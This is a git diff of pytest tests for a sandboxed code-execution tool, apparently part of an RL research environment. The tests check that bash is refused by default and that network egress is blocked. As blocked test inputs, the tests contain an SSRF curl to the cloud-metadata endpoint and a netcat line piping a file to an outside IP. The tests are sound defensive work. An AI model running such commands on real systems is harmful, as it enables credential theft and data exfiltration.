@@ -31,6 +31,7 @@ import pytest
 from src.rl.env import CallTool, MockSandboxBackend, ResearchEnv
 from src.rl.tools import ToolContext, ToolResult
 from src.rl.tools_exec import (
+    _SCRUBBED_ENV,
     ExecResult,
     LocalGuardedRunner,
     RunBashTool,
@@ -134,7 +135,9 @@ def test_run_code_allows_trivial_compute_and_lands_keyed_to_source_url() -> None
 
 
 def test_run_bash_allows_trivial_compute() -> None:
-    ctx = _ctx()
+    # Bash on the LOCAL runner is default-deny; benign offline use opts in via
+    # the explicit exec_allow_local_bash flag (production never sets it).
+    ctx = _ctx(extras={"exec_allow_local_bash": True})
     result = RunBashTool().run(ctx, {"command": "echo 4", "source_urls": [URL_PRODUCT]})
     assert result.ok is True
     assert result.display.strip() == "4"
@@ -179,19 +182,21 @@ def test_run_code_blocks_nonlocal_network_at_preflight() -> None:
 def test_runtime_connect_shim_blocks_nonlocal_but_allows_localhost() -> None:
     """The in-child socket.connect shim is the authoritative network-lock.
 
-    Uses 192.0.2.1 (TEST-NET-1) which passes the static screen but must be
-    blocked at runtime; and 127.0.0.1:7770 which the shim must permit (the
-    connection is refused since nothing listens, but NO PermissionError).
+    Uses a bare non-local hostname ('internalhost') which passes the static
+    screen (no IP literal, no forbidden TLD token) but must be blocked at runtime
+    by the getaddrinfo/connect shim; and 127.0.0.1:7770 which the shim must permit
+    (the connection is refused since nothing listens, but NO PermissionError).
     """
     ctx = _ctx()
-    # Non-local IP that dodges the static token screen -> blocked by the shim.
+    # Non-local host that dodges the static token + numeric-IP screen -> the
+    # snippet must reach the runtime shim, which blocks it.
     blocked = RunCodeTool().run(
         ctx,
         {
             "code": (
                 "import socket\n"
                 "try:\n"
-                "    socket.socket().connect(('192.0.2.1', 80))\n"
+                "    socket.socket().connect(('internalhost', 80))\n"
                 "    print('CONNECTED')\n"
                 "except PermissionError:\n"
                 "    print('BLOCKED')\n"
@@ -400,3 +405,81 @@ def test_local_runner_refuses_unsupported_lang() -> None:
     res = runner.run("ruby", "puts 1", timeout_s=1.0, cwd="/tmp", env={})
     assert isinstance(res, ExecResult)
     assert res.refused is not None and "unsupported_lang" in res.refused
+
+
+# =========================================================================== #
+# SECURITY: the local runner must NOT run bash without an isolating executor.
+# bash has no in-child network-lock shim, so default-deny means a deployment
+# that allow-lists run_bash without injecting a microVM gets a refusal, not
+# unguarded host bash (no implicit SSRF / outbound-exfil surface).
+# =========================================================================== #
+def test_run_bash_refused_on_default_local_runner() -> None:
+    # No injected executor + no opt-in flag -> bash must NOT execute locally.
+    ctx = _ctx()
+    result = RunBashTool().run(
+        ctx, {"command": "echo pwned", "source_urls": [URL_PRODUCT]}
+    )
+    assert result.ok is False
+    assert "bash_requires_microvm" in str(result.error)
+    # Nothing landed -> the command never ran.
+    assert result.snippets == {}
+    assert result.fetched_urls == []
+
+
+def test_local_runner_refuses_bash_directly_by_default() -> None:
+    runner = LocalGuardedRunner()
+    res = runner.run("bash", "echo hi", timeout_s=1.0, cwd="/tmp", env=dict(_SCRUBBED_ENV))
+    assert isinstance(res, ExecResult)
+    assert res.refused == "bash_requires_microvm"
+
+
+def test_local_runner_runs_bash_only_with_explicit_optin() -> None:
+    runner = LocalGuardedRunner(allow_local_bash=True)
+    import tempfile
+
+    cwd = tempfile.mkdtemp(prefix="exec_test_")
+    res = runner.run("bash", "echo 7", timeout_s=2.0, cwd=cwd, env=runner._scrubbed_env(cwd))
+    assert isinstance(res, ExecResult)
+    assert res.refused is None
+    assert res.stdout.strip() == "7"
+
+
+def test_run_bash_runs_under_injected_executor_without_optin() -> None:
+    # An injected isolating executor handles its own network sandbox, so bash is
+    # allowed through it even without the local opt-in flag.
+    echo = _FakeEchoExecutor(stdout="grepped\n")
+    ctx = _ctx(extras={"code_executor": echo})
+    result = RunBashTool().run(
+        ctx, {"command": "grep foo file.txt", "source_urls": [URL_PRODUCT]}
+    )
+    assert result.ok is True
+    assert result.snippets == {URL_PRODUCT: "grepped"}
+    assert echo.calls and echo.calls[0]["lang"] == "bash"
+
+
+# =========================================================================== #
+# SECURITY: the static network screen catches numeric-IP egress the fixed token
+# list misses (cloud-metadata SSRF + arbitrary outbound exfil hosts).
+# =========================================================================== #
+def test_static_preflight_blocks_cloud_metadata_and_numeric_ip() -> None:
+    # The cloud-metadata SSRF endpoint (link-local) must be refused.
+    assert preflight("curl -s http://169.254.169.254/latest/meta-data/") is not None
+    # An arbitrary numeric exfil target must be refused (was previously missed).
+    assert preflight("cat /tmp/x | nc 93.184.216.34 4444") is not None
+    assert check_network_egress("connect(('10.0.0.5', 22))") is not None
+    # Allowed localhost numeric address on any port passes the numeric screen
+    # (port enforcement is the runtime shim's job for python; bash is refused).
+    assert check_network_egress("connect(('127.0.0.1', 7770))") is None
+
+
+def test_run_bash_cloud_metadata_refused_before_optin_even_matters() -> None:
+    # Even with the opt-in flag, the static screen refuses the SSRF target so the
+    # snippet never launches.
+    ctx = _ctx(extras={"exec_allow_local_bash": True})
+    result = RunBashTool().run(
+        ctx,
+        {"command": "curl -s http://169.254.169.254/latest/meta-data/", "source_urls": [URL_PRODUCT]},
+    )
+    assert result.ok is False
+    assert "network_egress_blocked" in str(result.error)
+    assert result.snippets == {}
